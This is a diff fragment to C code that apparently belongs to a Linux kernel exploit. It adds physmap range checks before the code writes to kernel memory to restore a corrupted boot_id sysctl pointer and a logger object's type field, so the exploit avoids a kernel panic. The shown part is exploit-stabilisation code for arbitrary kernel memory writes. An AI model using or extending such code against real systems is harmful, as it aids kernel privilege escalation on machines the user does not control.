@@ -197,6 +197,19 @@ int repair_fake_fops_llseek(int fd) {
 int restore_slide_boot_id(int fd) {
   uintptr_t boot_id_data_ptr =
       SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
+  /* These are physmap aliases plus the *physical* offset. If the sum leaves the
+   * linear map, slide_p0_offset is not what this code assumes it is and the
+   * write would land somewhere unrelated -- which panics rather than fails.
+   * Refuse instead. */
+  if (!P0_ALIAS_IN_RANGE(boot_id_data_ptr)) {
+    pr_error("slide boot_id target %016llx outside physmap "
+             "[%016llx,%016llx) p0=%016llx -- refusing to write\n",
+             (unsigned long long)boot_id_data_ptr,
+             (unsigned long long)DIRECT_MAP_BASE,
+             (unsigned long long)DIRECT_MAP_END,
+             (unsigned long long)slide_p0_offset);
+    return 0;
+  }
   slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
   configfs_read_once(
       fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
@@ -218,6 +231,13 @@ int restore_slide_boot_id(int fd) {
 #ifdef SLIDE_RB_PARENT_TYPE_RESTORE
   uintptr_t parent_type = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset +
                           sizeof(uint64_t);
+  if (!P0_ALIAS_IN_RANGE(parent_type)) {
+    pr_error("slide parent_type target %016llx outside physmap "
+             "p0=%016llx -- refusing to write\n",
+             (unsigned long long)parent_type,
+             (unsigned long long)slide_p0_offset);
+    return 0;
+  }
   uint64_t type_before = 0;
   uint64_t type_after = 0;
   uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
